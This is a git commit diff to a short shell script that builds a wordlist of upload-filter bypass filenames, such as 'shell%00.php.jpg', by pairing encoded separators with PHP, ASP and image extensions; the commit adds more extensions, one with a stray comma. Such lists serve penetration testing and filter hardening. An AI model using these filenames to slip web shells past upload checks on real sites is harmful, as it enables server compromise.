4c3dbe4211ad43058c2fd894569c71b7ae0b49f6
tobiasGuta <156011774+tobiasGuta@users.noreply.github.com>
2025-03-17 19:20:44 -0400

    Update and rename bypassing-_php_whitelist_medium.sh to bypassing-_php_whitelist_large.sh

--- bypassing-_php_whitelist_large.sh
+++ bypassing-_php_whitelist_large.sh
@@ -1,5 +1,5 @@
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-    for ext in '.pht' '.phar' '.pgif' '.phtml' '.phtm' '.php' '.php3' '.php4' '.php5' '.phps' '.jpg' '.jpeg' '.png' '.gif' '.bmp' '.svg' '.tiff'; do
+    for ext in '.pht' '.phar' '.pgif' '.phtml' '.phtm' '.php' '.php3' '.php4' '.php5' '.phps' '.jpg' '.jpeg' '.png' '.gif' '.bmp' '.svg' '.tiff' '.shtml', '.asa' '.cer' '.asax' '.swf' '.xap'; do
         echo "shell$char$ext" >> wordlist.txt
         echo "shell$ext$char" >> wordlist.txt
         echo "shell.jpg$char$ext" >> wordlist.txt
